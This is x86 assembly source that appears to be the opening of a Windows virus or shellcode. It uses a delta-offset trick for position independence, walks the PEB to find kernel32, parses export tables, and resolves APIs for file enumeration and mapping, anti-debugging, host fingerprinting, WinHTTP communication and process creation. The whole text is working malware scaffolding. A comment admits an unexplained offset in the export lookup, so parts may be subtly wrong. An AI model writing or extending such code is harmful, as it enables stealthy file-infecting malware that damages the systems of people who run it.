start:
; Delta offset for PIC
call	delta
delta:
pop	ebp ; Retrieve eip
sub	ebp, delta ; Ebp + Label to get the data


; GETTING KERNEL32 FUNCTIONS
; GET BASE ADDRESS OF KERNEL32
xor 	ebx, ebx
mov 	ebx, fs:[030h] ; PEB
mov 	ebx, [ebx + 0Ch] ; PEB_LDR
mov 	ebx, [ebx + 014h] ; LBR 1st
mov 	ebx, [ebx] ; 2nd entry
mov 	ebx, [ebx] ; 3rd entry : kernel32 module (I hope so)
mov	ebx, [ebx + 010h] ; Base address Kernel32 (Holy grail ?)
mov	[DELTA pKernel32], ebx

; GET PROPERTIES DLL
mov	esi, [ebx + 03Ch] ; PE Header offset
add	esi, ebx
mov	esi, [esi + 078h] ; Export table offset
add	esi, ebx
mov	edi, [esi + 020h] ; Export Name Table offset
add	edi, ebx
mov	ecx, [esi + 014h] ; Number of functions

; LOOP FROM FUNCTIONS AND GET LoadLibrary & GetProcAddress
mov	eax, ebp
add	eax, offset sGetProcAddress
mov	edx, eax ; Search function
xor	eax, eax ; Counter
checkFunctionName:
mov	ecx, [edi] ; Function name offset
add	ecx, ebx
pusha ; Keep register
call	strcmp
test	eax, eax
popa
jz	functionFound
add	edi, 4 ; Get next function name
inc	eax
jmp	checkFunctionName ; I will find you
functionFound:
mov	edx, [esi + 01Ch] ; List of entry point
add	edx, ebx
mov	edx, [edx + eax * 4 + 4] ; Entry point of function (TODO - Why the fuck +4 ?)
add	edx, ebx
mov	[DELTA pGetProcAddress], edx

; Get User32 (Not without LoadLibrary !)
GETADDR	sLoadLibrary, pKernel32, pLoadLibrary
PDELTA	sUser32
call	[DELTA pLoadLibrary] ; LoadLibrary("user32.dll")
mov	[DELTA pUser32], eax
PDELTA	sWinHttp
call	[DELTA pLoadLibrary] ; LoadLibrary("Winhttp.dll")
mov	[DELTA pWinHttp], eax
; GET ALL THE THINGS !
GETADDR	sMessageBox, pUser32, pMessageBox
GETADDR	sExitProcess, pKernel32, pExitProcess
GETADDR	sCreateFile, pKernel32, pCreateFile
GETADDR	sCreateFileMapping, pKernel32, pCreateFileMapping
GETADDR	sMapViewOfFile, pKernel32, pMapViewOfFile
GETADDR	sUnmapViewOfFile, pKernel32, pUnmapViewOfFile
GETADDR	sCloseHandle, pKernel32, pCloseHandle
GETADDR	sWriteFile, pKernel32, pWriteFile
GETADDR	sFindFirstFile, pKernel32, pFindFirstFile
GETADDR	sFindNextFile, pKernel32, pFindNextFile
GETADDR	sGetSystemTime, pKernel32, pGetSystemTime
GETADDR	sIsDebuggerPresent, pKernel32, pIsDebuggerPresent
GETADDR	sGetComputerName, pKernel32, pGetComputerName
GETADDR	sGetVolumeInformation, pKernel32, pGetVolumeInformation
GETADDR	sWinHttpOpen, pWinHttp, pWinHttpOpen
GETADDR	sWinHttpConnect, pWinHttp, pWinHttpConnect
GETADDR	sWinHttpOpenRequest, pWinHttp, pWinHttpOpenRequest
GETADDR	sWinHttpSendRequest, pWinHttp, pWinHttpSendRequest
GETADDR	sWinHttpQueryDataAvailable, pWinHttp, pWinHttpQueryDataAvailable
GETADDR	sWinHttpReadData, pWinHttp, pWinHttpReadData
GETADDR	sWinHttpReceiveResponse, pWinHttp, pWinHttpReceiveResponse
GETADDR	sWinHttpCloseHandle, pWinHttp, pWinHttpCloseHandle
GETADDR	sCreateProcess, pKernel32, pCreateProcess
GETADDR	sCreateThread, pKernel32, pCreateThread
GETADDR	sWaitForSingleObject, pKernel32, pWaitForSingleObject
